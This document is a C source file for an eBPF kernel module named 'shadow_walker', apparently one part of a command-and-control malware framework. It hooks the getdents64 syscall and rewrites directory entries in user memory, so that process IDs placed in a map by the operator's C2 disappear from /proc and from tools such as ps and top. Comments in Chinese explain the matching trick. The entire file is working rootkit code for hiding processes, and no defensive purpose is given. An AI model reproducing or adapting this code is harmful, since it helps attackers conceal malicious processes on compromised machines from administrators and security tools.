// shadow_walker.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"shadow_walker\","
      "\"desc\":\"Process Hiding: Hooks getdents64 syscall to make target PIDs vanish from /proc and ps/top.\","
      "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
      "\"options\":{"
        "\"target\":[\"0\",\"Target PID to hide immediately upon loading\"]"
      "},"
      "\"maps\":{"
        // 与你的 agent.c 和 console.py 完美对应：8 字节的字符串 Key！
        "\"target\":{\"key_size\":8,\"value_size\":4,\"key_type\":\"u64\",\"value_type\":\"u32\"}"
      "}"
    "}";

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u64); // 8 字节字符串
    __type(value, u32);
} target SEC(".maps");

struct getdents_ctx {
    void *dirp;
    int   fd;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, struct getdents_ctx);
} active_getdents SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct getdents_ctx gctx = {};
    gctx.fd   = (int)ctx->args[0];
    gctx.dirp = (void *)ctx->args[1];
    bpf_map_update_elem(&active_getdents, &id, &gctx, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct getdents_ctx *gctx = bpf_map_lookup_elem(&active_getdents, &id);
    if (!gctx) return 0;

    int total = ctx->ret;
    void *dirp = gctx->dirp;
    bpf_map_delete_elem(&active_getdents, &id);

    if (total <= 0) return 0;

    int  offset      = 0;
    int  prev_offset = -1;
    unsigned short prev_reclen = 0;

    #pragma clang loop unroll(disable)
    for (int i = 0; i < 256; i++) {
        if (offset >= total) break;

        unsigned short d_reclen = 0;
        long err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
            dirp + offset + offsetof(struct linux_dirent64, d_reclen));
        if (err != 0 || d_reclen == 0) break;

        // 降维打击的核心：直接把目录名当成 8 字节内存块读出来
        char d_name[8] = {}; 
        
        // 2. 读取字符串。它遇到 \0 就会自动停止！剩下的字节完美保持为 0！
        bpf_probe_read_user_str(d_name, sizeof(d_name),
            dirp + offset + offsetof(struct linux_dirent64, d_name));

        // 3. 把这块洗干净的、带 \0 填充的内存，直接强制转换为 u64
        u64 raw_name_str = *(u64 *)d_name;

        // 此时，raw_name_str 里的内容就是 "58795\0\0\0"
        // 你的 C2 写入 Map 的也是 "58795\0\0\0"
        // 它们会在这里完美邂逅！
        if (bpf_map_lookup_elem(&target, &raw_name_str)) {
            if (prev_offset >= 0) {
                unsigned short new_reclen = prev_reclen + d_reclen;
                bpf_probe_write_user(
                    dirp + prev_offset + offsetof(struct linux_dirent64, d_reclen),
                    &new_reclen, sizeof(new_reclen));
                
                prev_reclen = new_reclen;
                offset += d_reclen;
                continue;
            }
        }

        prev_offset = offset;
        prev_reclen = d_reclen;
        offset += d_reclen;
    }
    return 0;
}